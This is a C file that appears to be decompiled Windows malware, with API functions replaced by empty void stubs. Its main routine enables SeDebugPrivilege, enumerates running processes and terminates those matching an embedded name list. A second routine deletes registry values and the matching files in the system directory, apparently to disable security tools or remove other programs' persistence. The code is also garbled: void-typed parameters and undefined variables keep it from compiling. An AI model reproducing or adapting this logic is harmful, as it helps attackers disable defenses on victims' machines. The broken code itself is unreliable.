
void memset(void,void,void); 
void memset(void a,void aa,void aaa) 
{
}
void ExitProcess(void); 
void ExitProcess(void a) 
{
}
void CloseHandle(void); 
void CloseHandle(void a) 
{
}
void lstrcmpiA(void,void); 
void lstrcmpiA(void a,void aa) 
{
}
void OpenProcess(void,void,void); 
void OpenProcess(void a,void aa,void aaa) 
{
}
void TerminateProcess(void,void); 
void TerminateProcess(void a,void aa) 
{
}
void Sleep(void); 
void Sleep(void a) 
{
}
void strcmp(void,void); 
void strcmp(void a,void aa) 
{
}
void RegOpenKeyExA(void,void,void,void,void); 
void RegOpenKeyExA(void a,void aa,void aaa,void aaaa,void aaaaa) 
{
}
void RegQueryValueExA(void,void,void,void,void,void); 
void RegQueryValueExA(void a,void aa,void aaa,void aaaa,void aaaaa,void aaaaaa) 
{
}
void RegDeleteValueA(void,void); 
void RegDeleteValueA(void a,void aa) 
{
}
void GetSystemDirectoryA(void,void); 
void GetSystemDirectoryA(void a,void aa) 
{
}
void sprintf(void,void,void,void); 
void sprintf(void a,void aa,void aaa,void aaaa) 
{
}
void DeleteFileA(void); 
void DeleteFileA(void a) 
{
}
void RegCloseKey(void); 
void RegCloseKey(void a) 
{
}


int main()
{
int v14,v15,v11;
char v[100];
sub_4AAB1E(v14,&v,a3,a4);
  memset(v14, v15, v11);
  sub_4AEBDA();
  ExitProcess(v11);
return;
}

 int  sub_4AAB1E(int a1, char *Str2, int a3, int a4)
{
  void v4; 
  void *v5; 
  void v6; 
  void v7; 
  void v8; 
  void v10; 
  void pe; 
  void me; 
  void hSnapshot; 
  void hObject; 
  const char String2; 

  pe.dwSize = 0;
  me.dwSize = 0;
  memset(&pe.cntUsage, 0, 0x124u);
  memset(&me.th32ModuleID, 0, 0x220u);
  if ( !CreateToolhelp32Snapshot || !Process32First || !Process32Next )
    return 0;
  sub_4AAAB3("SeDebugPrivilege", 1);
  v4 = CreateToolhelp32Snapshot(0xFu, 0);
  v5 = v4;
  hSnapshot = v4;
  if ( v4 == (void)-1 )
  {
LABEL_25:
    sub_4AAAB3("SeDebugPrivilege", 0);
    return 0;
  }
  pe.dwSize = 296;
  if ( !Process32First(v4, &pe) || !Process32Next(v5, &pe) )
  {
LABEL_24:
    CloseHandle(hSnapshot);
    goto LABEL_25;
  }
  while ( 1 )
  {
    if ( a3 )
    {
      hObject = 0;
      while ( 1 )
      {
        sub_4AA1D9((int)&String2, *(char **)((void)&off_4A1700 + (void)hObject));
        if ( !lstrcmpiA(pe.szExeFile, &String2) )
          break;
        hObject = (char *)hObject + 4;
        if ( (unsigned int)hObject >= 0x60 )
          goto LABEL_23;
      }
      v6 = OpenProcess(0x1F0FFFu, 0, pe.th32ProcessID);
      hObject = v6;
      if ( !v6 || TerminateProcess(v6, 0) )
        goto LABEL_23;
      v7 = hObject;
      goto LABEL_15;
    }
    if ( Str2 )
      break;
    if ( !a1 )
      goto LABEL_23;
    v8 = CreateToolhelp32Snapshot(8u, pe.th32ProcessID);
    me.dwSize = 548;
    if ( a4 )
    {
      if ( Module32First(v8, &me) )
        Sleep(0xAu);
      goto LABEL_23;
    }
    v7 = v8;
LABEL_15:
    CloseHandle(v7);
LABEL_23:
    if ( !Process32Next(hSnapshot, &pe) )
      goto LABEL_24;
  }
  if ( strcmp(pe.szExeFile, Str2) )
    goto LABEL_23;
  v10 = OpenProcess(0x1F0FFFu, 0, pe.th32ProcessID);
  CloseHandle(hSnapshot);
  if ( !TerminateProcess(v10, 0) )
  {
    CloseHandle(v10);
    return 0;
  }
  return 1;
}

void  sub_4AEBDA()
{
  char **v0; 
  char (**v1)[8]; 
  void cbData; 
  void hKey; 
  char Data; 
  char Buffer; 
  char FileName; 
void off_4A2D3C, off_4A2D40;
  cbData = 128;
  if ( off_4A2D3C )
  {
    v0 = &off_4A2D3C;
    v1 = &off_4A2D40;
    do
    {
      RegOpenKeyExA(*(v1 - 2), *v0, 0, 0x20019u, &hKey);
      if ( !RegQueryValueExA(hKey, *v1, 0, 0, &Data, &cbData) )
      {
        RegDeleteValueA(hKey, *v1);
        GetSystemDirectoryA(&Buffer, 0x104u);
        sprintf(&FileName, "%s\\%s", &Buffer, *(v1 + 2));
        DeleteFileA(&FileName);
      }
      RegCloseKey(hKey);
      v1 += 5;
      v0 = (char **)(v1 - 1);
    }
    while ( *(v1 - 1) );
  }
}

